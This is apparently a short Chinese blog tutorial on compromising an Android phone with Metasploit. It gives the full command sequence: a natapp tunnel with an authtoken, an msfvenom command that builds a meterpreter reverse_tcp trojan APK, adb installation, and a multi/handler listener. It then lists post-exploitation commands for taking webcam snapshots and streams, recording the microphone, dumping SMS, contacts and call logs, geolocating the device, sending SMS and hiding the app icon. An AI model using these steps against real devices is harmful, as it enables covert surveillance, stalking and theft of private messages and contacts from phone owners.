---
title: Metasploit渗透Android
tags:
  - android安全
abbrlink: 2059191303
date: 2019-08-01 14:44:14
---

## 内网穿透
进入https://natapp.cn/  
注册并创建tcp隧道  
复制authtoken  
下载客户端  

```
解压缩
chmod a+x natapp
./natapp

natapp -authtoken=9ab6b9040a624f40

ping server.natappfree.cc 得到服务器ip和端口号
```
## Metesploit木马
mac查看本机ip-设置-网络  
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=本机ip LPORT=natapp端口号 R >test1.apk
```
```
adb install test1.apk
```

## 启动msf
```
msfconsole

msf> use exploit/multi/handler 加载模块

msf> set payload android/meterpreter/reverse_tcp	选择Payload

修改Ip和端口

Ip设置为natapp中配置的本机ip
msf> set LHOST 本机ip		

端口设置为natapp中配置的本地端口	
msf> set LPORT 端口号			

开始监听，等待木马相应
msf> exploit	  

```
## 常用命令
```
Stdapi: Webcam Commands
===================================
	webcam_list  列出网络摄像头
	record_mic [ˈrekərd]/记录/  从默认麦克风录制音频为X秒
	webcam_chat  开始视频聊天
	webcam_snap  从指定的摄像头获取快照
	webcam_stream -i 1  从指定的网络摄像头播放视频流[选择后摄像头]

Android Commands
=================
	activity_start  从URI字符串启动Android活动
	check_root  检查设备是否有根
	dump_calllog  获取调用日志
	dump_contacts  获取联系人列表
	dump_sms  获取短信
	geolocate  利用地理定位获取当前LAT
	wlan_geolocate  利用WLAN信息获取当前LAT
	hide_app_icon  从发射器隐藏应用程序图标
	interval_collect  管理区间收集能力
	send_sms  从目标会话发送短消息
	set_audio_mode 
	sqlite_query  从存储库查询SQLite数据库
	wakelock  启用/禁用Wakelock

```

## LINKS
[natapp](https://natapp.cn)  
[Metasploit之渗透Android手机](https://blog.csdn.net/Aaron_Miller/article/details/80375807)   
[使用Metasploit实现对Android的远程管理](https://www.cnblogs.com/Te7m/p/5938445.html)  
[如何手动将Metasploit的Payloads注入到Android应用中](https://www.freebuf.com/articles/network/138688.html)  